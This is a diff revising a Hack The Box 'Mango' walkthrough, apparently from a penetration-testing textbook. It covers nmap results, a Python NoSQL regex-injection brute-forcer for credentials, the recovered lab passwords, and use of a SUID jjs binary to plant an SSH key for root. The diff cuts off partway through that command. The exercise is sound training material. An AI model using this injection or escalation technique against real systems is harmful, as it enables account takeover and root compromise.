@@ -1,26 +1,25 @@
 # Exercise: Writing a NoSQL injection password fuzzer for the Mango box
 
-In the Hack The Box machine Mango, an nmap scan reveals an Ubuntu box running SSH on port 22 u, a website on port 80 v and a website on port 443 w. The website on port 80 is returning a status code of 403 forbidden for the default home page. For the website on port 443, the SSL certificate reports a common name for the site of staging-order.mango.htb.
-
-PORT STATE SERVICE VERSION
+In the Hack The Box machine Mango, an nmap scan reveals an Ubuntu box running SSH on port 22, a website on port 80 and a website on port 443. The website on port 80 is returning a status code of 403 forbidden for the default home page. For the website on port 443, the SSL certificate reports a common name for the site of _**staging-order.mango.htb**_.
 
 ```bash
-u 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+PORT STATE SERVICE VERSION 
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
 | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
 |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
-v 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
 | http-methods:
 |_ Supported Methods: GET POST OPTIONS HEAD
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: 403 Forbidden
-w 443/tcp open ssl/ssl Apache httpd (SSL-only mode)
+443/tcp open ssl/ssl Apache httpd (SSL-only mode)
 | http-methods:
 |_ Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Mango | Search Base
-| x ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=
     Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
 | Issuer: commonName=staging-order.mango.htb/organizationName=
     Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
@@ -74,7 +73,7 @@ import requests
 from cmd import Cmd
 
 def inject(data):
-  v r = requests.post("http://staging-order.mango.htb/", 
+  r = requests.post("http://staging-order.mango.htb/", 
                       data=data, allow_redirects=False)
   if r.status_code != 200:
     return True
@@ -144,13 +143,13 @@ term = Terminal()
 term.cmdloop()
 ```
 
-To start with, the script imports u the Python module requests which we will use for handling the HTTP requests and responses and the module Cmd that will handle accepting command input at the terminal and executing commands in user friendly way. When run, the program will access the commands getuser &lt;user&gt; and getpassword &lt;user&gt;. These commands are defined as do\_getuser and do\_getpassword ~ as part of the Terminal class. do\_getuser calls the function brute\_user w which sets up a payload that uses the x the expression username\[$regex\]":"^". This will try and match any text that starts with the username we are passing in. So if the username was administrator, the expression would match text of "admin". In this way we can keep looping building up our test username one letter at a time and when we get a match, move on to the next. The injection is called y with whatever string we have passed into the function and then it loops z successively adding characters from ASCII 97 to ASCII 123, characters a through z. As this is a username we are testing, we can assume lower case alphabetic characters. For the password, we will widen the range to include non-alphabetic characters like numbers and special characters. Some characters need escaping because they have a special meaning in regex terms and this is done here }.
+To start with, the script imports u the Python module requests which we will use for handling the HTTP requests and responses and the module Cmd that will handle accepting command input at the terminal and executing commands in user friendly way. When run, the program will access the commands getuser &lt;user&gt; and getpassword &lt;user&gt;. These commands are defined as do\_getuser and do\_getpassword as part of the Terminal class. do\_getuser calls the function brute\_user w which sets up a payload that uses the x the expression username\[$regex\]":"^". This will try and match any text that starts with the username we are passing in. So if the username was administrator, the expression would match text of "admin". In this way we can keep looping building up our test username one letter at a time and when we get a match, move on to the next. The injection is called y with whatever string we have passed into the function and then it loops successively adding characters from ASCII 97 to ASCII 123, characters a through z. As this is a username we are testing, we can assume lower case alphabetic characters. For the password, we will widen the range to include non-alphabetic characters like numbers and special characters. Some characters need escaping because they have a special meaning in regex terms and this is done here.
 
-The function brute\_password { is similar, but operating on the password field and not username \|.
+The function brute\_password is similar, but operating on the password field and not username.
 
-The program starts with creating a Terminal object and calling the command loop that waits for input. If a string is passed to getuser, it will be used as the seed for the brute forcing of that user. A password will be fetched by getpassword for the user supplied as an argument. In this way, multiple users can be brute forced.
+The program starts with creating a Terminal object and calling the command loop that waits for input. If a string is passed to getuser, it will be used as the starting string for the brute forcing of that user. A password will be fetched by getpassword for the user supplied as an argument. In this way, multiple users can be brute forced.
 
-Running the application for users we get two, admin and mango. Running each of these reveals the passwords \(admin:t9KcS3&gt;!0B\#2 and mango:h3mXK8RhU~f{\]f5H\) and the user mango can SSH into the machine. Once on the box, we can see that in the /home directory there is the home directory of the other user admin. We can switch user using the su command and use the password we retrieved earlier for the user admin:
+Running the application for users we get two, admin and mango. Running each of these reveals the passwords \(_**admin:t9KcS3&gt;!0B\#2**_ and _**mango:h3mXK8RhU~f{\]f5H**_\) and the user mango can SSH into the machine. Once on the box, we can see that in the /home directory there is the home directory of the other user admin. We can switch user using the su command and use the password we retrieved earlier for the user admin:
 
 ```bash
 mango@mango:~$ su - admin
@@ -175,7 +174,7 @@ $ find / -perm -4000 2>/dev/null
 /usr/lib/snapd/snap-confine
 ```
 
-The interesting program here is jjs which will allows JavaScript to be run at the command line. Looking at GTFOBins, the jjs program can be used if it has SUID to write files and so we can use it to write an SSH key to root's .ssh directory. Generate an SSH key using ssh-keygen and then enter the contents of the key.pub file you generated into the script which you can copy and then paste into the terminal as the user admin :
+The interesting program here is jjs which will allows JavaScript to be run at the command line. Looking at GTFOBins, the _**jjs**_ program can be used if it has SUID to write files and so we can use it to write an SSH key to root's .ssh directory. On your own box, generate an SSH key using **ssh-keygen** \(no password\) and then enter the contents of the _**&lt; your keyname&gt;.pub**_ file you generated into the script which you can copy and then paste into the terminal as the user admin :
 
 ```bash
 echo 'var FileWriter = Java.type("java.io.FileWriter");
